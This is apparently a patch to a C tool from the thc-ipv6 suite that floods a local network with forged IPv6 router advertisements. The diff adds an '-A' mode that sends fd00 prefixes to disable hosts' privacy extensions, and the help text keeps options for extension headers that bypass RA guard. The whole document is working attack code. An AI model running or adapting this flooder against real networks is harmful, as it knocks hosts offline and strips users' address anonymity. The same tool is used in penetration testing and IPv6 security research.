@@ -20,6 +20,7 @@ void help(char *prg) {
   printf("-F/-D/-H add fragment/destination/hopbyhop header to bypass RA guard security.\n");
   printf("-R does only send routing entries, no prefix information.\n");
   printf("-P does only send prefix information, no routing entries.\n");
+  printf("-A is like -P but implements an attack by George Kargiotakis to disable privacy extensions\n");
 //  printf("Use -r to use raw mode.\n\n");
   exit(-1);
 }
@@ -31,17 +32,24 @@ int main(int argc, char *argv[]) {
   unsigned char *dst = thc_resolve6("ff02::1"), *dstmac = thc_get_multicast_mac(dst);
   int size, mtu, i, j, k, type = NXT_ICMP6, route_only = 0, prefix_only = 0, offset = 14;
   unsigned char *pkt = NULL;
-  int pkt_len = 0, rawmode = 0, count = 0, do_hop = 0, do_frag = 0, cnt, do_dst = 0;
+  int pkt_len = 0, rawmode = 0, count = 0, deanon = 0, do_hop = 0, do_frag = 0, do_dst = 0;
+  int cnt = ENTRIES, until = 0;
   thc_ipv6_hdr *hdr = NULL;
 
   if (argc < 2 || strncmp(argv[1], "-h", 2) == 0)
     help(argv[0]);
 
-  while ((i = getopt(argc, argv, "DFHRPr")) >= 0) {
+  while ((i = getopt(argc, argv, "DFHRPAr")) >= 0) {
     switch (i) {
     case 'r':
       thc_ipv6_rawmode(1);
       rawmode = 1;
+      break;
+    case 'A':
+      deanon = 1;
+      prefix_only = 1;
+      cnt = 5;
+      until = 256;
       break;
     case 'F':
       do_frag++;
@@ -54,9 +62,11 @@ int main(int argc, char *argv[]) {
       break;
     case 'R':
       route_only = 1;
+      cnt += ENTRIES;
       break;
     case 'P':
       prefix_only = 1;
+      cnt += ENTRIES;
       break;
     default:
       fprintf(stderr, "Error: invalid option %c\n", i);
@@ -102,7 +112,7 @@ int main(int argc, char *argv[]) {
   buf[19] = 12;
   j = 24;
   if (route_only == 0) {
-    for (i = 0; i < ENTRIES; i++) { // prefix
+    for (i = 0; i < cnt; i++) { // prefix
       buf[j] = 3; // prefix
       buf[j+1] = 4;
       buf[j+2] = size;
@@ -110,8 +120,13 @@ int main(int argc, char *argv[]) {
       buf[j+5] = 2;
       buf[j+9] = 1;
 //      memset(&buf[j+16], 255, 8);
-      buf[j+16] = 32;
-      buf[j+17] = 3;
+      if (deanon) {
+        buf[j+16] = 0xfd;
+        buf[j+17] = 0x00;
+      } else {
+        buf[j+16] = 0x20;
+        buf[j+17] = 0x12;
+      }
       buf[j+18] = (k % 65536) / 256;
       buf[j+19] = k % 256;
       j += 32;
@@ -119,7 +134,7 @@ int main(int argc, char *argv[]) {
     }
   }
   if (prefix_only == 0) {
-    for (i = 0; i < ENTRIES; i++) {  // route
+    for (i = 0; i < cnt; i++) {  // route
       buf[j] = 24;
       buf[j+1] = 3;
       buf[j+2] = size;
@@ -136,17 +151,17 @@ int main(int argc, char *argv[]) {
   }
   
   printf("Starting to flood network with router advertisements on %s (Press Control-C to end, a dot is printed for every 100 packet):\n", interface);
-  while (1) {
+  while (until != 1) {
     memcpy(&buf[20], (char*)&k, 4);
     memcpy(ip6 + 11, (char*)&k, 4);
     k++;
-    for (i = 0; i < ENTRIES; i++) {
+    for (i = 0; i < cnt; i++) {
       if (route_only == 0)
         memcpy(&buf[24 + 20 + i*32], (char*)&k, 4);
       k++;
       if (prefix_only == 0)
         if (route_only == 0)
-          memcpy(&buf[24 + 12 + i*24 + ENTRIES*32], (char*)&k, 4);
+          memcpy(&buf[24 + 12 + i*24 + cnt*32], (char*)&k, 4);
         else
           memcpy(&buf[24 + 12 + i*24], (char*)&k, 4);
       k++;
@@ -163,7 +178,7 @@ int main(int argc, char *argv[]) {
       if (type == NXT_ICMP6)
         type = NXT_FRAG;
       for (i = 0; i < do_frag; i++)
-        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, cnt++) < 0)
+        if (thc_add_hdr_oneshotfragment(pkt, &pkt_len, count + i) < 0)
           return -1;
     }
     if (do_dst) {
@@ -188,7 +203,12 @@ int main(int argc, char *argv[]) {
 //    usleep(1);
     if (count % 100 == 0)
       printf(".");
+    if (until > 1)
+      until--;
   }
+
+  if (deanon)
+    printf("\nPrivacy extension attack done.\n");
   
   return 0;
 }
